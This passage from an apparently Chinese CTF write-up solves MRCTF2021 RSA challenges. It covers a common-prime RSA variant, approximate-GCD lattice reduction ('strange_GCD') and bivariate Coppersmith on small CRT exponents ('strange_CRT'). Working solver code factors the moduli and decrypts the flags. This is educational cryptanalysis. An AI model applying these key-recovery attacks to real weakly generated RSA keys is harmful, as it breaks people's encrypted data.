class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49</span></span><br><span class="line">c1 = <span class="number">0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kbits = int(1024*0.2247)</span></span><br><span class="line"><span class="string">m0 =  0x436f6d6d6f6e207072696d652052534120697320612076617269616e74206f66205253410000000000000000000000000000000000000000000000000000000000416e642074686520636f6d6d6f6e20666163746f722067206973206c61726765207072696d6520616e6420703d3267612b3120713d3267622b31</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = ((m0 + x*2**464)^e1) - c1</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">g1 = f.small_roots(X=2^kbits,beta=1)[0]</span></span><br><span class="line"><span class="string">print(g1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">g1 = <span class="number">1328458990599515056771144217738449144496664370133586446617480019409757</span></span><br><span class="line">v1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) % (<span class="number">2</span>*g1)</span><br><span class="line">u1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) // (<span class="number">2</span>*g1)</span><br><span class="line">left = (((<span class="number">2</span> * iroot(n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">2</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line">right = (((<span class="number">3</span> * iroot(<span class="number">2</span>*n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">4</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">b = <span class="built_in">pow</span>(<span class="number">114514</span>,<span class="number">2</span>*g1,n1)</span><br><span class="line">base = <span class="built_in">pow</span>(b,left,n1)</span><br><span class="line">D = iroot(right - left,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">step = <span class="built_in">pow</span>(b,D,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(D):</span><br><span class="line">    dic[base] = i</span><br><span class="line">    base = base * step % n1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;baby step ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">pow</span>(b,u1,n1)</span><br><span class="line">step = inverse(b,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(D):</span><br><span class="line">    <span class="keyword">if</span>(base <span class="keyword">in</span> dic):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ans found!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i,dic[base])</span><br><span class="line">        c = left+ i + D * dic[base]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    base = base * step % n1</span><br><span class="line"></span><br><span class="line">A = u1 - c</span><br><span class="line">B = v1 + c * <span class="number">2</span> * g1</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p1 = x*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q1 = y*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p1 * q1 == n1</span><br><span class="line">phi1 = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">c1 = <span class="number">0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5</span></span><br><span class="line">g2 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffd</span></span><br><span class="line">c2 = <span class="number">0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) // (<span class="number">2</span>*g2)</span><br><span class="line">B = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) % (<span class="number">2</span>*g2)</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p2 = x*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q2 = y*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p2 * q2 == n2</span><br><span class="line">phi2 = (p2-<span class="number">1</span>) * (q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-GCD"><a href="#strange-GCD" class="headerlink" title="strange_GCD"></a>strange_GCD</h2><blockquote><p><a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">paper</a></p></blockquote><p>给出了9组公钥，满足 $N&#x3D;P\cdot Q_i+R_i$ ，其中 $P$ 是444位、 $Q$ 是444位、 $R$ 是333位，那么显然只要求出 $P$ 、 $Q$ 其中一个即可，因为<br>$$<br>\begin{equation}\begin{split}<br>Q_1\cdot N_2-Q_2\cdot N_1&amp;&#x3D;Q_0(Q_1P+R_1)-Q_1(Q_0P+R_2) \\<br>&amp;&#x3D;Q_0R_1-Q_1R_0 \\<br>&amp;≈Q_{bits}\cdot P_{bits}<br>\end{split}\end{equation}<br>$$<br>所以我们构建这样的一个格子：<br>$$<br>M&#x3D;<br>\begin{bmatrix}<br>2^{P_{bits}} &amp; x_1 &amp; x_2 &amp; \cdots &amp;x_n \\<br>&amp;-x_0 \\<br>&amp;&amp;-x_0 \\<br>&amp;&amp;&amp;\ddots \\<br>&amp;&amp;&amp;&amp;-x_0<br>\end{bmatrix}<br>$$<br>所以一定存在一个向量 $\vec{v}&#x3D;(Q_0,Q_2,\cdots,Q_n)$ 满足 $\vec{v}\cdot M&#x3D;(Q_0·2^P_{bits},Q_0N_1-Q_1N_0,…,Q_0N_n-Q_nN_0)$ ，那么就能得到 $Q_{list}$ ，自然就能分解 $N$ ，正常解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = [<span class="number">8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216</span>, <span class="number">9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905</span>, <span class="number">7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900</span>, <span class="number">6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116</span>, <span class="number">5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729</span>, <span class="number">8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063</span>, <span class="number">6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426</span>, <span class="number">6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991</span>, <span class="number">5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062</span>]</span><br><span class="line">C = [<span class="number">800378461059400239726680783421062702546581299113618553895453491207714321944554499622887232532612118204284779120928524046451494597619154079853122057618867592408424421335915888671560524092660578952242621890439766919785431411789789232309134048322721650012432166587969915464252995890054635969469155870141839815222805619769926841873928532</span>, <span class="number">8685468246369062574820183134847029157229023858170863526469628501966638181721681547114662091162797572149161013458000532984909663639626346493828947027439012131912176125653717020650233650230608573276523862941298063827867869000918623143520066067119099918633173584693454642685133071154989133688921507896223776765538029556643440655490373815</span>, <span class="number">4635611296372235589362291842711945807825964919968727011796279830725567747087132786100965922682161492876463568645940638975728831156672106717718242995621775763972524561170035488180440169190421072680121175269363490806991700969253196228364471655905426168859215651384013432550900570720981720919343406680667172355882395426739478340888619526</span>, <span class="number">742099161415136628218807400531862454374875770332166710320711769923774839345990297388615457974047093967700994503615622499139058644697776431451063778211507061619987487339659448529973693084099004007650792690143707738139278995489030445825999666762580518420739517354868021396496747289677543653758101688499365196709600349831855157276274803</span>, <span class="number">4273006447766599851029197343910625305964779588947130545729882009677080459892767902139074897266046998378948193319329776150920821074305998905666368175737032487336505440974393061632257356697260043478850055918798196360043557336723402834256592984312957607731622934368169520289756716653736422872196593367101920308166527352079412344590114695</span>, <span class="number">1337615323422531101514598853478737615483725265103339849469231329210692205474781484172946466402355800190175297435923447189337380569240535257395618353403524999296122247241720498058900285176383928871155893061316083476812641934026019749574784965397208046520128690081232283708190247657782663414534596381371506499151016470118707739609022847</span>, <span class="number">6153442337491399463730666360630451953223069596225489087488144486112604050064388945200405772892415725900338512969888610774357818442533883395713661512978158729825590405567077341407532331228257558692149544940358814513930330757334104407683768945074261746314376336567331685071086776886141587264981001140113933152084084711732651014186070962</span>, <span class="number">3604640305526232611907645024550062043296875756707299105733076926046725900367109300556792007038226350415916164581084668832286944703572581980333135146219609212135443758296278947833224676930513359604019639508959092586550129343133801670578311053639151186604019506764426302411065588655525183584977810609190948096510237056027272167828516985</span>, <span class="number">2085633143403792178757363870459578017278494765962824809917819295576034993395441252397370078671500834434293581806342828037037877739374959864038090394888141183851040814572501861997433316552606005140700519616064369570511427453278726929921212633252656552135711332324923683242632912449218888750151556281762432994484741408165895663710356342</span>]</span><br><span class="line"></span><br><span class="line">M = [[<span class="number">1</span>&lt;&lt;<span class="number">334</span>]+N[<span class="number">1</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(N)-<span class="number">1</span>):</span><br><span class="line">    M.append([<span class="number">0</span>]*(i+<span class="number">1</span>)+[-N[<span class="number">0</span>]]+[<span class="number">0</span>]*(<span class="built_in">len</span>(N)-i-<span class="number">2</span>))</span><br><span class="line"><span class="comment"># print(M)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">M = [</span></span><br><span class="line"><span class="string">    [34996011596528190789960035633881941845650710894291398982812329702559247987190014771576210832368861184, 9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905, 7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900, 6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116, 5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729, 8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063, 6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426, 6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991, 5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062], </span></span><br><span class="line"><span class="string">    [0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">M = Matrix(ZZ,M)</span></span><br><span class="line"><span class="string">ans = M.LLL()[0]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ans = (<span class="number">4599191779324727072633164871296325902208765537352604303273175255453504312615500983406477011435819405305852059674048438016100668090246407849496908743817335622801573073136122188609246369046057261291320848819844418920893230598376364951805862565686868625621955071425273509220849374947161975251582041718784</span>, <span class="number">104098035638581595369723778375711537486830709046687306114704921816239533823901066113680320504395210089789340199402154288158599251547931748565815387310900885326892681968536308019715590493310968628489043723240348362149053110811668282038727688689374505928586075094912392544924601844136642390813222425809</span>, <span class="number">1102834391862716869946827309486981604079530638763397950737361315055931768373793498250981455412829162997772327814660070857951309312894092377859437366989526531813223828179941289064128320123411973263239142716310770401174174815638810202859450962632995611863799694649198457635953086959463939627719575381012</span>, <span class="number">753994729336183961852361196205654448289304004519434287316796470222521627865083763102251102951626213588497716067551706990220346381353586508856365765536744873026409087910505560761761024675350156647185336440841519838638415417607956807382719719007131540587566462617043290548957627028678429439567176392108</span>, -<span class="number">71708524916293121808333775279085691365967960919759775147913431698619192878017855212957980666806523648996086462040461850162074426038300683815953081712090679643498963889027587516137252350693864785830427057530016147319149926968346502476418390469709928547235995568090970863872980806983047965126211827423</span>, -<span class="number">1031944069356990593465028628753183012193322903943969718261363844383250576817774501764794204795605186147444430878687291921605373814843580367545369212301939780213941922732623750390324618190490307261983930269957183493345355165692496865409582827167136484989492550271511982793001065621702409883049993239817</span>, -<span class="number">1960547215826715829528682564527292643865866291188443591530567078511330848396016229325567425830200701694380104625201031396661972809519249893882531604307311435727272867042265335921514343841646164420771255718802644103398765492144311189111408831887333483581772033575516358581006829893858562536866631199694</span>, -<span class="number">1402335387560657499009395932180425308829816453818907356038567333645529829409747360872073366794556975860774421104509218449157997408918101385420918273310166387609041772539330599075043569860214109051067579537008367501834723009929827486300772678346407596106869832512579102180928086682172345775047825906065</span>, <span class="number">6492859743402427013224957526773612476031280993044690607784160057686880229209831538939045987606076773313125546427811186808795218860181360435151657439459135171731642225975056613348164819235317913083153227881911185574679170305638348499347070097938480392885289493284095645409615468925393679398090634630</span>)</span><br><span class="line">Q = []</span><br><span class="line">Q.append(ans[<span class="number">0</span>]&gt;&gt;<span class="number">333</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(ans)):</span><br><span class="line">    Q.append(-(ans[i]-Q[<span class="number">0</span>]*N[i])//N[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P = N[<span class="number">0</span>] // Q[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(C)):</span><br><span class="line">    flag += long_to_bytes(<span class="built_in">pow</span>(C[i],inverse(e,(P-<span class="number">1</span>)*(Q[i]-<span class="number">1</span>)),(P*Q[i])))[-<span class="number">5</span>:]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-CRT"><a href="#strange-CRT" class="headerlink" title="strange_CRT"></a>strange_CRT</h2><blockquote><p><a href="https://link.springer.com/content/pdf/10.1007%2F3-540-45708-9_16.pdf">paper</a></p></blockquote><p>二元的coppersmith，首先有 $e\cdot dq&#x3D;1\pmod{q-1}$ ，即 $e\cdot dq-k\cdot(q-1)-1&#x3D;0$ ，即 $e\cdot dq+k-1&#x3D;k\cdot q$ ，因为 $dq$ 只有40位，所以 $dq$ 和 $k$ 都比较小，我们设 $f(x,y)&#x3D;ex+y$ ，一定存在一个根 $(dq,k-1)$ ，我们使用 $x-shifted$ 方法构造方程组，</p><p>$$<br>B_P(4)&#x3D;<br>\begin{bmatrix}<br>N^2X^3 \\<br>eNX^3 &amp; -NX^2Y \\<br>e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\<br>e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3<br>\end{bmatrix}<br>$$<br>随后找到根 $(dq,k-1)$ ，即可分解 $N$ 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243</span></span><br><span class="line">e = <span class="number">5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087</span></span><br><span class="line">c = <span class="number">6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097</span></span><br><span class="line">m = <span class="number">114514</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">beta = 0.34</span></span><br><span class="line"><span class="string">delta = 0.02</span></span><br><span class="line"><span class="string">amplification = 2048</span></span><br><span class="line"><span class="string">X = int(pow(n,delta) * (5/2))</span></span><br><span class="line"><span class="string">Y = int(pow(n,(beta+delta)) * (5/2))</span></span><br><span class="line"><span class="string">M = []</span></span><br><span class="line"><span class="string">M.append([n*n*X*X*X,0,0,0])</span></span><br><span class="line"><span class="string">M.append([e*n*X*X*X,-n*X*X*Y,0,0])</span></span><br><span class="line"><span class="string">M.append([e*e*X*X*X,-2*e*X*X*Y,X*Y*Y,0])</span></span><br><span class="line"><span class="string">M.append([e*e*e*X*X*X,-3*e*e*X*X*Y,3*e*X*Y*Y,-Y*Y*Y])</span></span><br><span class="line"><span class="string">M = Matrix(M)</span></span><br><span class="line"><span class="string">A = M.LLL()[0]</span></span><br><span class="line"><span class="string">p = []</span></span><br><span class="line"><span class="string">p.append(A[0]//(X**3))</span></span><br><span class="line"><span class="string">p.append(A[1]//(X^2*Y))</span></span><br><span class="line"><span class="string">p.append(A[2]//(X*Y^2))</span></span><br><span class="line"><span class="string">p.append(A[3]//(Y^3))</span></span><br><span class="line"><span class="string">R.&lt;x,y&gt; = ZZ[]</span></span><br><span class="line"><span class="string">f = x**3*p[0] + x**2*y*p[1] + x*y**2*p[2] + y**3*p[3]</span></span><br><span class="line"><span class="string">f.factor()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(-1) * (144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717*x + 636751972323*y) * (22360612316620576265962363998986325309879295954423979763235633587165509772463851121464450246995467551277856854280313242339679743870302000793124620978436719868879086932947083203923324893801655101558128409321266258664105566594644972878236716985754511292295147466953475408456421662883470405599945529089115443773171753380747253399676451061853675376543473713650224588466737340581901289431253330538396922770846601154595827366651699780258116005162252520473266535156064285895366446187694020122502168871153774940666139567620938830703125690675687869510298889906793*x^2 + 267647155976378743685890593144685469708715653490308593667201283907775452606689307120817149553958120371639890271685148603015657241238590179583153694790949220206995033824074078242830758458739742301161015368049847345525661233185551949155450470189603595130241004416639482696460716023144193868351704190287775402159037407591606868297555272291534131071*x*y - 1177035497855139471300150596073079881470359423070664560562543221821780066461677777154411563960425838478371703085673516387654415520557027*y^2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717</span> + <span class="number">1</span></span><br><span class="line">dq = <span class="number">636751972323</span></span><br><span class="line">q = (e * dq + k - <span class="number">1</span>) // k</span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MRCTF2021-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MRCTF2021-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MRCTF2021&amp;#39;</summary>
      
    
    
    
